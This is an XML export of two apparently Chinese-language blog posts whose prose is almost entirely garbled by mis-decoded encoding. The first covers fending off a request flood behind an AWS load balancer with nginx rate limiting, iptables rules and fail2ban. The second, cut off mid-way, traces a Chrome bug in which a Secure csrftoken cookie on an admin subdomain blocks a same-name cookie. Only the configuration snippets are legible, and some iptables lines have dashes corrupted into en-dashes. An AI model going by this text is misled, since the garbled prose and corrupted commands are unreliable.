    <content><![CDATA[å‰è¨€æœ€è¿‘ç™¼ç”Ÿä¸»æ©Ÿè¢«å¤§é‡ request æ”»æ“Šçš„äº‹ä»¶ï¼Œè€Œä¸”æ…˜çš„æ˜¯é€™å°ä¸»æ©Ÿæ”¾çš„æ˜¯è«–å£‡æœå‹™å‡è¨­æ”»æ“Šçš„é»æ˜¯è«–å£‡é¦–é ï¼Œæ¯æ¬¡ request éƒ½æœƒå» query DBï¼Œè€Œä¸”æœ‰ä¸€å † joinå…¶ä¸­é‚„æœ‰äº›æ˜¯ POST çš„æŒ‡ä»¤æœƒè®“ db updateå°±é€™æ¨£ä¸€ç›´ç˜‹ç‹‚åˆ select åˆ update å°è‡´ DB lockï¼Œcpu é£†é«˜æ›æ‰  
å¦‚æœè«–å£‡æ˜¯è‡ªå·±å¯«çš„ï¼Œé‚„å¯ä»¥åœ¨ DB è·Ÿ application ä¹‹é–“åŠ ä¸Š redis ä¹‹é¡çš„å¿«å–ä½†ååé€™å€‹è«–å£‡ç³»çµ±æ˜¯åˆ¥äººçš„ï¼Œæ²’æœ‰è¾¦æ³•å‹•  
å…ˆç°¡å–®è¬›ä¸€ä¸‹æ¶æ§‹ï¼Œç‚ºäº†åˆ†æ•£æµé‡ï¼Œå‰é¢æœ‰ä¸€å° AWS ELB åš load balancingï¼Œå¾Œé¢æœ‰å…©å°æ©Ÿå™¨ï¼Œæ‰€æœ‰ request éƒ½æœƒå…ˆåˆ° ELBï¼Œå†è‡ªå‹•åˆ°å¾Œé¢å…©å°å…¶ä¸­ä¸€å°ã€‚
WAFè¢«æ”»æ“Šä¹‹å¾Œæ€éº¼è¾¦å‘¢ï¼Ÿç¬¬ä¸€å€‹æƒ³åˆ°çš„å°±æ˜¯å¾ aws æä¾›çš„æœå‹™ï¼šWAF ä¾†æ“‹https://aws.amazon.com/tw/waf/
å¯æ˜¯ç™¼ç¾ WAF è·ŸåŸæœ¬æƒ³çš„ä¸ä¸€æ¨£ï¼Œä»–æ²’æœ‰è¾¦æ³•è¨­å®šåƒæ˜¯ï¼šã€Œæ“‹æ‰ 10 ç§’é˜å…§ç™¼è¶…é 100 å€‹ request çš„ IPã€é€™ç¨®è¦å‰‡
nginxåªèƒ½ç¹¼çºŒåœ¨ç¶²è·¯ä¸Šæ‰¾è§£æ³•ï¼Œæ‰¾åˆ°å¾ nginx ä¾†æ“‹çš„è§£æ³•ï¼š  
nginxé˜²æ­¢DDOSæ”»å‡»é…ç½®é€šè¿‡Nginxå’ŒNginx Plusé˜»æ­¢DDoSæ”»å‡»Module ngx_http_limit_req_module
http &#123;  //è§¸ç™¼æ¢ä»¶ï¼Œé™åˆ¶ ip æ¯ç§’ 10 å€‹ request  limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;     server &#123;    location  ~ \.php$ &#123;      //åŸ·è¡Œçš„å‹•ä½œ      limit_req zone=one burst=5 nodelay;       &#125;  &#125;&#125;

ç¸½ä¹‹å°±æ˜¯åˆ©ç”¨ limit_req_zoneï¼Œé€™å€‹ nginx æä¾›çš„æ±è¥¿å®£å‘Šä¸€å€‹ 10mb çš„ zone å«åš one ä¾†å„²å­˜ç‹€æ…‹ï¼Œé€™è£¡çš„ 10r/s æŒ‡çš„å°±æ˜¯ä¸€ç§’ 10 å€‹ request  
æ¥è‘—åœ¨ä½ æƒ³æ“‹çš„åœ°æ–¹åŠ ä¸Šï¼šlimit_req zone=one burst=5 nodelay;ï¼Œå°±å¯ä»¥æ“‹æ‰äº†nginx æœƒæŠŠè™•ç† request çš„æ•¸é‡èª¿æ•´æˆã€Œæœ€å¤š 1 ç§’ 10 å€‹ã€ï¼Œå¦‚æœé‚£å€‹ ip åœ¨åŒä¸€æ™‚é–“æœ‰è¶…é 5 å€‹ request é‚„æ²’è™•ç†çš„è©±ï¼Œå°±æœƒå‚³å› 503 service temporarily unavailableï¼Œé€™é‚Šçš„ 5 å°±æ˜¯ burst è¨­å®šçš„å€¼å‚³å›å»çš„ status code ä¹Ÿå¯ä»¥è‡ªå·±æŒ‡å®šï¼Œä¾‹å¦‚èªªï¼šlimit_req_status 505;
å„˜ç®¡é€™å€‹è§£æ³•çœ‹èµ·ä¾†å¾ˆæ£’ï¼Œä½†ä¸çŸ¥é“ç‚ºä»€éº¼ï¼ŒåŠ äº†ä¹‹å¾Œå¥½åƒæ²’æœ‰ç”¨ä¼¼çš„ä¼ºæœå™¨çš„è­¦å ±é‚„æ˜¯ä¸€ç›´åœ¨éŸ¿ï¼ŒDB é‚„æ˜¯æŒçºŒé£†é«˜  
iptablesåœ¨è«‹æ•™éå…¶ä»–åŒäº‹ä¹‹å¾Œï¼Œå¾—çŸ¥ iptabls ä¹Ÿå¯ä»¥æ“‹ï¼Œè€Œä¸”é‚„æ˜¯ç›´æ¥å¾ tcp å±¤æ“‹æ‰¾åˆ°ä¸‹é¢å…©ç¯‡è³‡æ–™ï¼š
æ·ºè«‡DDoSæ”»æ“Šé˜²è­·  
-A INPUT -p tcp â€“dports 80 -j WEB_SRV_DOS-A WEB_SRV_DOS -p tcp â€“syn â€“dports 80 -m recent â€“rcheck â€“second 30 â€“hitcount 200 -j LOG â€“log-prefix &quot;[Possible DOS Attack]&quot;-A WEB_SRV_DOS -p tcp â€“syn â€“dports 80 -m recent â€“rcheck â€“second 30 â€“hitcount 200 -j REJECT  -A WEB_SRV_DOS -p tcp â€“syn â€“dports 80 -m recent â€“set  -A WEB_SRV_DOS -p tcp â€“dports 80 -j ACCEPT

é‹ç”¨ iptables é™åˆ¶åŒä¸€IPå–®ä½æ™‚é–“é€£ç·šæ•¸  
-A INPUT -p tcp --dport 80 -m recent --rcheck --seconds 1 --hitcount 5 --name HTTP_LOG --rsource -j DROP-A INPUT -p tcp --dport 80 -m recent --set --name HTTP_LOG --rsource-A INPUT -p tcp --dport 80 -j ACCEPT

å…©å€‹çš„åŸç†éƒ½ä¸€æ¨£ï¼Œæ˜¯é€é-m recent â€“rcheck â€“second 30 â€“hitcount 200 é€™æ®µæ•˜è¿°ï¼Œæè¿°èªªä½ è¦æ“‹ä½å¹¾ç§’å…§ç™¼é€å¹¾æ¬¡çš„ requestï¼ŒæŠŠé€™å€‹é€£ç·š reject æˆ–æ˜¯ dropã€‚  
ç›´æ¥å¾ iptables å»æ“‹è½èµ·ä¾†æ˜¯å€‹æ›´å¥½çš„è§£æ³•ï¼Œé€™æ¨£ request é€£ nginx éƒ½ä¸æœƒé€²å»å°±è¢«æ“‹ä½äº†ï¼Œå¯æ˜¯å¤©ä¸å¾äººé¡˜ï¼Œç”¨äº†ä¹‹å¾Œç™¼ç¾é‚„æ˜¯ä¸è¡Œï¼æ€éº¼æœƒé€™æ¨£å‘¢ï¼
fail2banå¿ƒç°æ„å†·ä¹‹ä¸‹ï¼ŒåŒäº‹åˆæ¨è–¦ä¸€å€‹å¥½æ±è¥¿å«åšï¼šfail2banï¼ŒæŸ¥äº†ä¸€ä¸‹ä¹‹å¾Œç™¼ç¾ç”¨æ³•éå¸¸ç°¡å–®ï¼Œè€Œä¸”åŸç†å¾ˆå¥½æ‡‚ï¼Œæ±ºå®šç”¨åˆ¥å°æ©Ÿå™¨ä¾†æ¸¬æ¸¬çœ‹ï¼Œæ¸¬è©¦æˆåŠŸä¹‹å¾Œå†å¥—ç”¨åˆ°æ­£å¼ç’°å¢ƒçš„æ©Ÿå™¨ã€‚
ç”¨ Fail2Ban é˜²ç¯„æš´åŠ›ç ´è§£ (SSHã€vsftpã€dovecotã€sendmail)fail2banæ•™å­¸Ubuntu ä¸­ä½¿ç”¨ fail2ban é‡å°å¤§é‡ access åšåˆ¤æ–·åŠé˜»æ“‹  
ç¶œåˆå…¶ä¸­å¹¾ç¯‡çš„æ•˜è¿°ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹æµç¨‹  
1.ä¿®æ”¹vim /etc/fail2ban/jail.local2.å¯«å…¥  
[http-get-dos]enabled = trueport = httpfilter = http-get-doslogpath = /var/log/nginx/access.log # è¦åˆ¤æ–·çš„logmaxretry = 100 # æœ€å¤šå¹¾æ¬¡findtime = 5 # æ™‚é–“å€é–“bantime = 600 # è¦ ban å¤šä¹…action = iptables[name=HTTP, port=http, protocol=tcp]

ä¸Šé¢çš„è¦å‰‡å°±æ˜¯ï¼š5 ç§’å…§å˜—è©¦ 100 æ¬¡å¤±æ•—ä¹‹å¾Œå°± ban 600 ç§’  
3.æ–°å¢/etc/fail2ban/filter.d/http-get-dos.confé€™é‚Šçš„æª”åå°±æ˜¯å°æ‡‰åˆ°å‰›å‰› jail.local è¨­å®šçš„åç¨±  
[Definition]failregex = ^&lt;HOST&gt;- - .*\&quot;(GET|POST).*ignoreregex =

é€™è£¡çš„failregexè¦æ ¹æ“šä½ çš„ log å»å¯«ï¼Œåƒæ˜¯ nginx çš„ access log é•·é€™æ¨£ï¼š  
106.184.3.122 - - [21/Jul/2016:11:38:29 +0000] &quot;GET / HTTP/1.1&quot; 200 396 &quot;-&quot; &quot;Go-http-client/1.1&quot;

ä½ å°±å¯«ä¸€å€‹å¯ä»¥æŠ“åˆ°&lt;HOST&gt;ï¼Œä¹Ÿå°±æ˜¯ ip çš„ regular expression  
éƒ½è¨­å®šå¥½ä¹‹å¾Œï¼Œé‡é–‹ä¸€ä¸‹æ‡‰è©²å°±æœ‰æ•ˆäº†ï¼Œå°±æœƒç™¼ç¾ä¸€ç›´ç™¼ request ä¹‹å¾Œè‡ªå·±é †åˆ©çš„è¢« ban æ‰å¯ä»¥ç”¨ iptables --list çœ‹ä¸€ä¸‹è‡ªå·±æ˜¯ä¸æ˜¯çœŸçš„æœ‰è¢« ban  
fail2ban çš„åŸç†æ‡‰è©²å°±æ˜¯å»çœ‹ä½ æŒ‡å®šçš„ log æª”è·Ÿè¦å‰‡ï¼Œç”¨é€™å€‹æª”æ¡ˆå»åˆ¤æ–·æ˜¯ä¸æ˜¯è¶…å‡ºè¨­å®šçš„è¦å‰‡ï¼Œè¶…å‡ºçš„è©±å°±æŠŠ ip æŠ“å‡ºä¾†ï¼ŒåŠ è¦å‰‡åˆ° iptables è£¡é¢å»æ“‹æ‰ï¼Œæ™‚é–“åˆ°äº†ä¹‹å¾Œå†æŠŠè¦å‰‡ç§»é™¤æ‰  
æ ¹æ“šä¼ºæœå™¨æ¶æ§‹èª¿æ•´è©¦åˆ°é€™é‚Šï¼Œçµ‚æ–¼æˆåŠŸäº†ï¼å¯æ˜¯æ—¢ç„¶åŸç†ä¹Ÿæ˜¯ iptablesï¼Œç‚ºä»€éº¼å‰›å‰›ä¸è¡Œå‘¢ï¼Ÿé‚„è¨˜å¾—ä¸€é–‹å§‹æˆ‘æéä¼ºæœå™¨æ¶æ§‹å—ï¼Ÿå‰é¢ä¸€å° ELBï¼Œå¾Œé¢å…©å° web serverå› ç‚º ELB æ˜¯ AWS æä¾›çš„æœå‹™ï¼Œæ‰€ä»¥å®¢è£½åŒ–ç¨‹åº¦å¾ˆä½ï¼Œç”šè‡³é€£ ssh é€²å»éƒ½ä¸è¡Œå› æ­¤ä¸Šé¢å˜—è©¦çš„æ–¹æ¡ˆéƒ½æ˜¯å€‹åˆ¥å¥—ç”¨åˆ°é‚£å…©å° web server  
é€™æ™‚å€™å•é¡Œå°±ä¾†äº†ï¼š  

å’¦ï¼Ÿé‚£é€™æ¨£å­ web server çš„ request çš„ä¾†æºï¼Œä¸å°±éƒ½æ˜¯ ELB çš„ ip äº†å—ï¼Ÿ

æ²’éŒ¯ï¼Œä½ çªç ´ç›²é»äº†ï¼ä¹‹å‰æ²’æœ‰ç”¨å°±æ˜¯å¡åœ¨é€™é‚Šä½ ç”¨ iptables ä¾†æª”ï¼Œå› ç‚ºä¾†æºéƒ½æ˜¯ ELB çš„ ipï¼Œæ‰€ä»¥æœƒæ“‹æ‰çš„åªæœ‰ ELBï¼Œè€Œä¸æ˜¯çœŸæ­£çš„æ”»æ“Šä¾†æºï¼Œæ‰€ä»¥æœƒé€ æˆ ELB è¢«æ“‹æ‰ï¼Œæ•´å€‹æœå‹™å°±å› ç‚ºä¸€å€‹æ”»æ“Šè€…è¢«æçš„è¶…ç´šæ…¢
æ‰€ä»¥åœ¨é€™å€‹ç¶²è·¯ç’°å¢ƒåº•ä¸‹ï¼Œiptables æ˜¯è¡Œä¸é€šçš„ï¼é‚£ nginx å‘¢ï¼Ÿé‚„è¨˜å¾—æˆ‘å€‘çš„è¦å‰‡å—ï¼Ÿ  
limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s; 

$binary_remote_addræŠ“åˆ°çš„ä¹Ÿéƒ½æœƒæ˜¯ ELB çš„ ip  
é€™æ™‚å€™éˆæ©Ÿä¸€å‹•çªç„¶æƒ³åˆ°ï¼Œé‚£èƒ½ä¸èƒ½æ ¹æ“šX-Forwarded-Foré€™å€‹ header ä¾†è¨­å®šå‘¢ï¼Ÿå°±æœƒæ˜¯çœŸçš„ IP äº†æ‰¾åˆ°é€™ä¸€ç¯‡ï¼šnginx rate limiting with X-Forwarded-For header
æŠŠ$binary_remote_addræ›æˆ$http_x_forwarded_for
æå®šï¼å¤§åŠŸå‘Šæˆç¶“æ­·ä¸€ç•ªåƒè¾›è¬è‹¦ï¼Œæœ€å¾Œçµ‚æ–¼åœ¨ nginx æŠŠæ”»æ“Šæµé‡æ“‹æ‰ç”¨ JMeter æ¸¬è©¦ä¹‹å¾Œä¹Ÿç™¼ç¾ç¢ºå¯¦æˆåŠŸäº†ï¼Œå¤šçš„ request æœƒç›´æ¥å›å‚³ 503ï¼Œæœ€å¾ŒæˆåŠŸè§£æ±ºä¸»æ©Ÿè¢«æ”»æ“Šçš„å•é¡Œã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>DDoS</tag>
        <tag>nginx</tag>
        <tag>iptable</tag>
        <tag>fail2ban</tag>
      </tags>
  </entry>
  <entry>
    <title>æˆ‘é‡éçš„æœ€é›£çš„ Cookie å•é¡Œ</title>
    <url>/2017/03/24/difficult-problem-of-cookie/</url>
    <content><![CDATA[å‰è¨€å¹¾å€‹ç¦®æ‹œå‰æˆ‘åœ¨å·¥ä½œä¸Šç¢°åˆ°äº†ä¸€äº›è·Ÿ Cookie æœ‰é—œçš„å•é¡Œï¼Œåœ¨é€™ä¹‹å‰ï¼Œæˆ‘åŸæœ¬æƒ³èªªï¼šCookie ä¸å°±é‚£æ¨£å˜›ï¼Œå°±ç®—æœ‰äº›å±¬æ€§ä¸å¤ªç†Ÿæ‚‰ï¼Œä¸Šç¶²æ‰¾ä¸€ä¸‹è³‡æ–™å°±å¥½äº†ï¼Œå“ªæœ‰ä»€éº¼è·Ÿ Cookie æœ‰é—œçš„é›£é¡Œï¼Ÿ
ç„¶è€Œäº‹å¯¦è­‰æ˜æˆ‘éŒ¯äº†ã€‚æˆ‘é‚„çœŸçš„ç¢°åˆ°äº†ä¸€å€‹è®“æˆ‘è§£è¶…ä¹…çš„ Cookie å•é¡Œã€‚
ç›¸ä¿¡çœ‹åˆ°é€™é‚Šï¼Œå¾ˆå¤šäººæ‡‰è©²èºèºæ¬²è©¦äº†ï¼Œé‚£æˆ‘å°±å…ˆä¾†è€ƒä¸€ä¸‹å¤§å®¶ï¼š

ä»€éº¼æƒ…å½¢ä¸‹ï¼ŒCookie æœƒå¯«ä¸é€²å»ï¼Ÿ

åƒæ˜¯èªæ³•éŒ¯èª¤é‚£ç¨®é¡¯è€Œæ˜“è¦‹çš„å°±ä¸ç”¨èªªäº†ï¼Œé™¤æ­¤ä¹‹å¤–ä½ å¯èƒ½æœƒç­”èªªï¼šå¯«å®Œå…¨ä¸åŒ domain çš„ Cookieã€‚ä¾‹å¦‚èªªä½ çš„ç¶²é åœ¨ http://a.com å»ç¡¬è¦å¯« http://b.com çš„ Cookieï¼Œé€™ç¨®æƒ…å½¢ç•¶ç„¶å¯«ä¸é€²å»ã€‚
æˆ–è€…ï¼Œä½ å¯èƒ½æœƒå›ç­”ï¼šä¸åœ¨ https å»æƒ³åŠ ä¸Š Secure flag çš„ Cookieã€‚æ²’éŒ¯ï¼Œåƒæ˜¯é€™ç¨®æƒ…å½¢ä¹Ÿæœƒå¯«ä¸é€²å»ã€‚
é™¤äº†é€™äº›ï¼Œä½ é‚„èƒ½æƒ³åˆ°ä»€éº¼å—ï¼Ÿ
å¦‚æœæƒ³ä¸å¤ªåˆ°ï¼Œé‚£å°±è½æˆ‘å¨“å¨“é“ä¾†å§ï¼
æ‚²åŠ‡çš„é–‹å§‹åœ¨ä¸€å€‹æœˆå‰æˆ‘å¯«äº†ä¸€ç¯‡è·Ÿ CSRF æœ‰é—œçš„æ–‡ç« ï¼ˆè®“æˆ‘å€‘ä¾†è«‡è«‡ CSRFï¼‰ï¼Œæ­£æ˜¯å› ç‚ºå·¥ä½œä¸Šéœ€è¦å¯¦ä½œ CSRF çš„é˜²ç¦¦ï¼Œæ‰€ä»¥è¶æ©Ÿç ”ç©¶äº†ä¸€ä¸‹ã€‚ç°¡å–®ä¾†èªªï¼Œå°±æ˜¯è¦åœ¨ Cookie è¨­ç½®ä¸€å€‹ csrftokenã€‚
å¯æ˜¯é‚£å¤©æˆ‘å»ç™¼ç¾ï¼Œæˆ‘æ€éº¼å¯«éƒ½å¯«ä¸é€²å»ã€‚
æˆ‘çš„æ¸¬è©¦ç¶²ç«™çš„ç¶²å€æ˜¯ï¼šhttp://test.huli.comï¼Œæ‹¿ä¾†å¯« Cookie çš„ script æ˜¯ï¼š
document.cookie = &quot;csrftoken=11111111; expires=Wed, 29 Mar 2020 10:03:33 GMT; domain=.huli.com; path=/&quot;

æˆ‘å°±åªæ˜¯æƒ³å°.huli.comå¯«ä¸€å€‹åç¨±æ˜¯csrftokençš„ Cookieã€‚è€Œæˆ‘ç¢°åˆ°çš„å•é¡Œï¼Œå°±æ˜¯æ€éº¼å¯«éƒ½å¯«ä¸é€²å»ã€‚
é€™æ®µèªæ³•å®Œå…¨æ²’æœ‰å•é¡Œï¼Œæˆ‘æª¢æŸ¥éå¥½å¹¾éäº†ï¼Œä½†å°±æ˜¯ä¸çŸ¥é“ç‚ºä»€éº¼å¯«ä¸é€²å»ã€‚æˆ‘å€‘é–‹é ­è¬›çš„é‚£å¹¾ç¨® case é€™é‚Šéƒ½å®Œå…¨æ²’ç¢°åˆ°ã€‚é€™åªæ˜¯ä¸€å€‹ç°¡å–®çš„ http ç¶²ç«™ï¼Œè€Œä¸”æ˜¯å¯«è‡ªå·± domain çš„ Cookieï¼Œæ€éº¼æœƒå¯«ä¸é€²å»ï¼Ÿ
å‰›é–‹å§‹ç¢°åˆ°é€™æƒ…å½¢ï¼Œæˆ‘é‚„æƒ³èªªæœƒä¸æœƒæ˜¯æˆ‘é›»è…¦çš„éˆç•°ç¾è±¡ï¼Œåœ¨å…¶ä»–äººçš„é›»è…¦ä¸Šå°±å¥½äº†ï¼Œå°±æš«æ™‚æ²’æœ‰ç®¡å®ƒï¼Œç›´åˆ°æœ‰ä¸€å¤© PM è·Ÿæˆ‘èªªï¼šã€Œå’¦ï¼Œé€™å€‹é é¢æ€éº¼å£äº†ï¼Ÿã€ï¼Œæˆ‘ä»”ç´°æª¢æŸ¥å¾Œæ‰ç™¼ç¾æ˜¯å› ç‚ºä»–ä¹Ÿå¯«ä¸é€²å»é€™å€‹ Cookieï¼Œå°è‡´ server æ²’æœ‰æ”¶åˆ° csrftoken è€Œé©—è­‰å¤±æ•—ã€‚
å¥½äº†ï¼Œçœ‹ä¾†ç¾åœ¨å·²ç¶“ç¢ºèªä¸æ˜¯æˆ‘é›»è…¦ä¸Šçš„å•é¡Œäº†ï¼Œè€Œæ˜¯å¤§å®¶éƒ½æœƒé€™æ¨£ã€‚å¯æ˜¯ï¼Œå»æœ‰å…¶ä»–äººæ˜¯æ­£å¸¸çš„ã€‚å…¶ä»–äººéƒ½å¯ä»¥ï¼Œä½†å°±åªæœ‰æˆ‘è·Ÿ PM å…©å€‹äººä¸è¡Œã€‚
å¹¸å¥½è¦‹éå°é¢¨å°æµªçš„æˆ‘çŸ¥é“ï¼Œæ¯æ¬¡ç¢°åˆ°é€™ç¨®è©­ç•°çš„å•é¡Œï¼Œå…ˆé–‹ç„¡ç—•æ¨¡å¼å†èªªï¼Œè‡³å°‘å¯ä»¥çŸ¥é“ä½ çš„ç€è¦½å™¨ä¸æœƒè¢«å…¶ä»–å› ç´ çµ¦å¹²æ“¾ã€‚æ‰“é–‹ç„¡ç—•æ¨¡å¼ä¹‹å¾Œç™¼ç¾ï¼Œå¯ä»¥äº†ï¼Œå¯ä»¥è¨­å®š Cookie äº†ã€‚åœ¨ä¸€èˆ¬æƒ…æ³ä¸‹ä¸è¡Œè¨­å®šï¼Œä½†æ˜¯é–‹ç„¡ç—•ç€è¦½æ¨¡å¼å»å¯ä»¥ã€‚
é€™å°±çœŸçš„å¾ˆå¥‡æ€ªäº†ï¼Œåˆ°åº•ç‚ºä»€éº¼ä¸è¡Œå‘¢ï¼Ÿè€Œä¸”è‹¥æ˜¯æˆ‘æŠŠ Cookie æ›äº†ä¸€å€‹åå­—ï¼Œå«åšcsrftoken2ï¼Œå°±å¯ä»¥å¯«å…¥äº†ï¼å°±å”¯ç¨csrftokené€™å€‹åç¨±ä¸è¡Œï¼Œå¯æ˜¯ Cookie ç¸½ä¸å¯èƒ½æœ‰ä¿ç•™å­—é€™ç¨®æ±è¥¿å§ï¼å°±ç®—çœŸçš„æœ‰ï¼Œcsrftokenä¹Ÿçµ•å°ä¸æœƒæ˜¯ä¿ç•™å­—ã€‚
é€™ä¸€åˆ‡éƒ½å¤ªè©­ç•°äº†ï¼Œåˆ°åº•csrftokené€™å€‹åå­—æœ‰ä»€éº¼å•é¡Œï¼Ÿåˆ°åº•ç‚ºä»€éº¼å¯«ä¸é€²å»ï¼Ÿ
æ–¼æ˜¯æˆ‘å°±å»æ‹œäº† Google å¤§ç¥ï¼Œç”¨cookie ä¸èƒ½å¯«ã€cookie can not setã€unable set cookieç­‰ç­‰çš„é—œéµå­—å»æœå°‹ï¼Œå»éƒ½ä¸€ç„¡æ‰€ç²ï¼Œæ‰¾åˆ°çš„ç­”æ¡ˆéƒ½è·Ÿæˆ‘çš„æƒ…æ³å®Œå…¨ä¸ä¸€æ¨£ã€‚
æˆ‘ç”¨ Chrome devtool çœ‹äº†ï¼Œæ˜æ˜http://test.huli.comå°±æ²’æœ‰ä»»ä½•çš„ Cookieï¼Œæ€éº¼æœƒå¯«ä¸é€²å»å‘¢ï¼Ÿ
åœ¨ç¶“æ­·éä¸€é™£äº‚æ‰¾è³‡æ–™ä¹‹å¾Œï¼Œæˆ‘é‚„ç¨å¾®å»ç¿»äº† cookie çš„ rfcï¼šHTTP State Management Mechanismï¼Œä½†é‚„æ˜¯æ²’æœ‰æ‰¾åˆ°ç›¸é—œè³‡æ–™ã€‚
æœ€å¾Œä¸çŸ¥é“å“ªä¾†çš„éˆæ„Ÿï¼Œæˆ‘å°±å» Chrome çš„è¨­å®šé‚£é‚Šæª¢è¦–æ‰€æœ‰ huli.com çš„ Cookieï¼Œä¸¦ä¸”ä¸€å€‹ä¸€å€‹çœ‹éä¹‹å¾Œåˆªæ‰ã€‚åˆªå®Œä¹‹å¾Œï¼Œå°±å¯ä»¥æ­£å¸¸å¯«å…¥ Cookie äº†ã€‚
ä»”ç´°æƒ³æƒ³å…¶å¯¦é‚„æ»¿åˆç†çš„ï¼Œç•¢ç«Ÿç„¡ç—•æ¨¡å¼å¯ä»¥ï¼Œå°±ä»£è¡¨æ˜¯ä»¥å‰åšçš„ä¸€äº›äº‹æƒ…æœƒå½±éŸ¿åˆ°å¯« Cookie é€™ä»¶äº‹ï¼Œå†ç¶“ç”±åˆªé™¤ Cookie å°±å¯ä»¥ç¢ºèªå•é¡Œä¸€å®šæ˜¯å‡ºåœ¨å…¶ä»–æœ‰é—œçš„ Domain èº«ä¸Šï¼Œæ¨æ¸¬æ˜¯å…¶ä»– Domain åšäº†ä¸€äº›äº‹æƒ…ï¼Œæ‰æœƒé€ æˆ http://test.huli.com æ²’è¾¦æ³•å¯«å…¥ Cookieã€‚
å¾Œä¾†æˆ‘å›æƒ³èµ·å‰›å‰›åˆªæ‰çš„é‚£å¹¾å€‹ Cookieï¼Œç™¼ç¾å­˜åœ¨ä¸€å€‹ä¹Ÿå«åšcsrftokençš„åŒå cookieã€‚
æ’¥é›²è¦‹æ—¥é›£å¾—è®“æˆ‘æ‰¾åˆ°äº†ä¸€é»ç·šç´¢ï¼Œç•¶ç„¶è¦è·Ÿè‘—é€™æ¢ç·šç´¢ç¹¼çºŒæŸ¥ä¸‹å»ã€‚
å›æƒ³äº†ä¸€ä¸‹ï¼Œç™¼ç¾æ˜¯å¦å¤–ä¸€å€‹è² è²¬å¾Œå°ç®¡ç†çš„ç¶²ç«™å«åšï¼šhttps://admin.huli.comå¯«çš„ï¼Œå› ç‚ºæ˜¯ç”¨ djangoçš„é—œä¿‚ï¼Œæ‰€ä»¥é–‹å•Ÿ CSRF é˜²è­·ä¹‹å¾Œé è¨­çš„ Cookie åç¨±å°±æ˜¯csrftokenã€‚
ä»”ç´°å†ç”¨ Chrome devtool çœ‹äº†ä¸€ä¸‹ï¼Œé€™å€‹ Cookie è¨­ç½®äº†Secureï¼ŒDomainæ˜¯ .admin.huli.comã€‚çœ‹èµ·ä¾†ä¹Ÿæ²’ä»€éº¼ç•°ç‹€ã€‚
ç„¶è€Œï¼Œåœ¨æ‹œè¨ªé€™å€‹ç¶²ç«™ä¹‹å¾Œï¼Œæˆ‘å†è©¦è‘—å» http://test.huli.comï¼Œç™¼ç¾åˆæ²’è¾¦æ³•å¯«å…¥ Cookie äº†ï¼Œç”šè‡³åŸæœ¬çš„ Cookie ä¹Ÿé›¢å¥‡åœ°æ¶ˆå¤±äº†ã€‚
å¤ªæ£’äº†ï¼çœ‹ä¾†æˆ‘é›¢çœŸç›¸è¶Šä¾†è¶Šè¿‘äº†ï¼
æˆ‘æŠŠé€™å€‹.admin.huli.comçš„åŒå Cookie åˆªæ‰ä¹‹å¾Œï¼Œå»æ‹œè¨ªæˆ‘è‡ªå·±çš„http://test.huli.comï¼Œç™¼ç¾ä¸€åˆ‡éƒ½æ­£å¸¸ã€‚Cookie å¯ä»¥æ­£å¸¸å¯«å…¥ã€‚
çœ‹ä¾†ç­”æ¡ˆå¾ˆæ˜é¡¯äº†ï¼Œé‚£å°±æ˜¯ï¼š

åªè¦.admin.huli.comçš„é‚£å€‹åŒå Cookie å­˜åœ¨ï¼Œhttp://test.huli.comå°±æ²’è¾¦æ³•å°.huli.comå¯«å…¥åŒåçš„ Cookieã€‚

è§£æ³•å…¶å¯¦åˆ°é€™é‚Šå°±å¾ˆæ˜é¡¯äº†ï¼Œç¬¬ä¸€å€‹æ˜¯æ”¹ä¸€å€‹ Cookie åç¨±ï¼Œç¬¬äºŒå€‹æ˜¯æ”¹ä¸€å€‹ Domainã€‚
æœ‰é—œæ–¼ç¬¬äºŒå€‹è§£æ³•ï¼Œé‚„è¨˜å¾—æˆ‘å€‘åœ¨ http://test.huli.com æ˜¯å¯«å…¥ .huli.com é€™å€‹ Domain çš„ Cookie å—ï¼Ÿåªè¦æ”¹æˆå¯«å…¥ .test.huli.com é€™å€‹ Domainï¼Œä¸€æ¨£å¯ä»¥æ­£å¸¸é‹ä½œã€‚
æ‰€ä»¥è‹¥æ˜¯è¬›å¾—æ›´è©³ç´°ä¸€é»ï¼Œé€™å€‹å¯«ä¸é€²å» Cookie çš„å•é¡Œå°±ç™¼ç”Ÿåœ¨ï¼š

ç•¶æœ‰ä¸€å€‹ Domain ç‚º.admin.huli.comä¸¦è¨­ç½®æˆSecureçš„ Cookie å·²ç¶“å­˜åœ¨çš„æ™‚å€™ï¼Œhttp://test.huli.comå°±æ²’è¾¦æ³•å°.huli.comå¯«å…¥åŒåçš„ Cookieã€‚

åœ¨å¤§æ¦‚ç¢ºèªå•é¡Œä»¥å¾Œï¼Œæˆ‘å°±é–‹å§‹èª¿æ•´å„å€‹è®Šå› ï¼Œçœ‹èƒ½ä¸èƒ½æŸ¥å‡ºåˆ°åº•æ˜¯å“ªä¸€å€‹ç’°ç¯€å‡ºäº†å•é¡Œï¼Œæœ€å¾Œæˆ‘ç™¼ç¾å…©å€‹é‡é»ï¼š

å…¶å¯¦åªæœ‰ Chrome ä¸èƒ½å¯«ï¼ŒSafari, Firefox éƒ½å¯ä»¥
Secure é€™å€‹ flag æ²’æœ‰è¨­ç½®çš„è©±ï¼Œå°±å¯ä»¥å¯«

æ·±å…¥è¿½æŸ¥æ—¢ç„¶æœ‰äº†åªæœ‰ Chrome æœƒç™¼ç”Ÿé€™ç¨®æƒ…å½¢çš„é€™å€‹æœ‰åŠ›ç·šç´¢ï¼Œå°±å¯ä»¥å¾ªè‘—é€™æ¢ç·šç¹¼çºŒè¿½æŸ¥ä¸‹å»ï¼Œé‚£æ€éº¼è¿½æŸ¥å‘¢ï¼Ÿ
æ²’éŒ¯ï¼Œå°±æ˜¯æœ€ç°¡å–®ç›´æ¥çš„æ–¹æ³•ï¼šå»æ‰¾ Chromium çš„åŸå§‹ç¢¼ï¼
